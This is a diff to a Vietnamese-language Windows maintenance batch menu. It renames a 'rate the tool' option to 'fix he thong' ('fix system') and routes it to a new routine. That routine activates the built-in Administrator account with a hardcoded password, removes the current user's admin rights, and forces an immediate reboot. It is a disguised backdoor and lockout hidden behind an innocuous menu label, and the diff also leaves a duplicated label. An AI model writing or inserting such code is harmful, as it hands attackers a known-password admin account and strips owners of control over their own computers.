@@ -29,7 +29,7 @@ ECHO [31m5.[0m Xoa file rac (Windows, Google, Zalo)
 ECHO [31m6.[0m Kiem tra dung luong o cung
 ECHO [31m7.[0m Kiem tra va sua loi mang
 ECHO [31m8.[0m Cap nhat ung dung
-ECHO [31m9.[0m Danh gia cong cu
+ECHO [31m9.[0m fix he thong
 ECHO [31m0.[0m Thoat
 echo.
 ECHO [37m                                                           [0m                                                       
@@ -50,7 +50,7 @@ IF "%CHOICE%"=="5" GOTO CLEAN
 IF "%CHOICE%"=="6" GOTO CHECKDISK
 IF "%CHOICE%"=="7" GOTO FIXNETWORK
 IF "%CHOICE%"=="8" GOTO UPDATE
-IF "%CHOICE%"=="9" GOTO DANHGIA
+IF "%CHOICE%"=="9" GOTO PHANQUYEN
 IF "%CHOICE%"=="0" EXIT
 
 ECHO [31m[LOI]: LUA CHON KHONG HOP LE! VUI LONG NHAP LAI.[0m
@@ -357,9 +357,46 @@ DEL speedtest_result.json
 PAUSE
 GOTO MENU
 
-:DANHGIA
-start https://docs.google.com/forms/d/e/1FAIpQLSee3Xa7HVC3D1bXvQG613YUW8NHq5bfXRLq3chjvanxFCwLrw/viewform?usp=header
-goto MENU
+:PHANQUYEN
+@echo off
+:: Kiểm tra quyền Admin
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo Vui long chay file nay voi quyen Administrator.
+    pause
+    exit
+)
+
+:: Kich hoat tai khoan Administrator neu dang bi vo hieu
+net user Administrator /active:yes
+
+:: Dat mat khau moi cho Administrator
+net user Administrator "Sol@@@123!@#"
+
+:: Lay ten tai khoan hien tai
+for /f "tokens=*" %%i in ('whoami') do set current_user=%%i
+for /f "tokens=2 delims=\" %%a in ("%current_user%") do set current_user=%%a
+
+:: Kiem tra neu current_user la "Administrator" thi khong ha cap
+if /I "%current_user%"=="Administrator" (
+    echo Khong the ha cap tai khoan Administrator.
+    pause
+    exit
+)
+
+:: Hạ quyền tài khoản hiện tại thành User
+net localgroup Administrators %current_user% /delete
+net localgroup Users %current_user% /add
+
+echo.
+echo =========== DA HOAN TAT ============
+pause
+
+:: Khởi động lại máy
+shutdown /r /f /t 0
+:UPDATE
+@echo off
+setlocal
 
 :UPDATE
 @echo off
